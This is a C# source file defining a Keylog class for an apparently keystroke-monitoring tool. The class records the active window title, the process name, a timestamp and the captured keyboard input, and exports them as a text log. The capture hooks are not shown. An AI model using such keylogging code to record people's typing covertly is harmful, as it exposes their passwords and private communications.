using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Windows.Forms;

namespace MonitorLiteCore
{
    internal class Keylog
    {
        public DateTime Date { get; private set; }
        public string WindowTitle { get; private set; }
        public string WindowProcessName { get; private set; }
        public string UserInput { get { return _userInput.ToString(); } }

        private Keylog(string windowTitle,Process process)
        {
            this.Date = DateTime.Now;
            this.WindowTitle = windowTitle;
            try
            {
                using (process)
                {
                    this.WindowProcessName = process.ProcessName;
                }
            }
            catch
            {
                this.WindowProcessName = "Unknown";
            }
            _userInput = new StringBuilder();
        }

        private StringBuilder _userInput;

        public void AppendKeyboardEvent(KeyboardMonitorEventArgs e)
        {
            
            string s = e.ToLog();

            _userInput.Append(s);

        }

        public string Export()
        {
            return string.Format("TITLE : \"{0}\"\r\nPROCESS NAME : \"{1}\"\r\nDATE : {2} {3}\r\nCONTENT : \r\n{4}",this.WindowTitle,this.WindowProcessName,this.Date.ToShortDateString() ,this.Date.ToShortTimeString(),this.UserInput);
        }

        public static Keylog Create(WindowChangeMonitorEventArgs e)
        {
            Keylog k = new Keylog(e.WindowTitle, e.WindowProcess);
            return k;
        }

     
    }
}
